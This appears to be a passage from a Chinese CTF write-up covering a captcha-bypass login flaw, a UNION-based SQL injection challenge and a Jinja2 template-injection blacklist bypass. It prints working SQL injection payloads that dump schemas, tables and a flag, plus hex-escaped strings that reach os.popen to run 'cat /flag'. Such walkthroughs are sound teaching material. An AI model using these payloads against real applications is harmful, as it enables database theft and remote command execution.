试验登录逻辑：

  • 在验证码错误，密码不知道（废话，知道我一会还爆破个蛋）的情况下，会返回验证码错误。
  • 试着抓一个包，然后发现，对于每次不同的验证码，在反复使用任意一次cookie的情况下，可以一直登录（后端没有机制杀掉老旧cookie）。感谢tsctf官方的wp（笑

P.S：一些dsh的补充：

验证码的安全价值不在"图片长得难不难认"，而在于答案是否只为服务端所知、且只用一次。这道题的图片连干扰线都懒得加，答案还是服务端亲手写成文字递过来的——它看起来像一道门，实际是一张贴在门上的钥匙。

无状态 Cookie 在原理上无法表达"一次性"。Cookie 能携带数据，不能消费数据——没有"这个值已用过"的概念。要一次性就必须有服务端状态（Redis 存 sid→answer，校验后 DEL + 过期）。

信息不只在页面里，也在响应头里。登录后页面"啥也没有"，但 Set-Cookie 里躺着 token。这是黑盒题的基本功：抓包看完整响应，不只盯渲染结果。

T2-ez_sql

–updated on 9-27

打开后发现是一个叫Vulnerability Database的玩意，反正根据题目来说就是一个sql注入。首先规规矩矩尝试1~8，发现是随便写了些web的具体漏洞。但是和flag没什么关系。但既然是sql，我们自然是先用原来那几步试试的好：

1' # 这个正常，说明可以带引号（事实上是下一个order by的时候，数字型没用

1' Order by 3 ; # 到4报错，说明就只有显示的那三行

-1' UNION SELECT 111,schema_name,database() from information_schema.schemata; #

-1' UNION SELECT 111,database(),table_name from information_schema.tables where table_schema = database(); #

-1' UNION SELECT 111,database(),column_name from information_schema.columns where table_schema = database() and table_name = "flag"; #

一直到这里都没什么问题，我们满怀期待地尝试-1' union select 111, 222, flag from flag; # 试图就此搞到flag。但是……

但是到这里，发现union突然被ban了，怎么你之前就不ban😡

询问ds网页版老师，发现：

你遇到的 Illegal mix of collations for operation 'UNION' 错误，核心原因是SQL语句中参与 UNION 查询的各列，其字符集（Collation）不一致，MySQL 无法决定用哪一个规则来合并结果。

🧐 为什么会报这个错？

在 SQL 注入中，你构造的 -1' union select 111, 222, flag from flag; # 会和原查询合并。原查询的列（如 first_name）有自己的字符集，而你注入的 flag 列或字符串常量 111、222 也可能有各自的字符集。当这些字符集不匹配时，UNION 操作就无法进行，从而抛出此错误。

这在 DVWA 等靶场中很常见，因为靶场数据库的 users 表和 information_schema 等系统表的字符集可能不同（例如一个是 utf8_general_ci，另一个是 utf8_unicode_ci）

改成-1' union select 111, 222, CONVERT(flag using utf8) from flag; # convert一下编码即可。

|attr + 十六进制转义

Jinja2 有一个过滤器 |attr，可以按属性名访问对象属性：

这等价于 lipsum.__globals__。

但 __globals__ 本身在黑名单里（globals），所以不能明文写。
于是把属性名写成 十六进制转义字符串：

'\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f' 在 Python/Jinja2 字符串解析后就是 __globals__。
WAF 检查时看到的是一堆 \x5f，里面没有 globals 这个连续子串，所以不触发黑名单。

同理：

  • '\x6f\x73' → os
  • '\x70\x6f\x70\x65\x6e' → popen
  • '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67' → cat /flag
  • '\x72\x65\x61\x64' → read
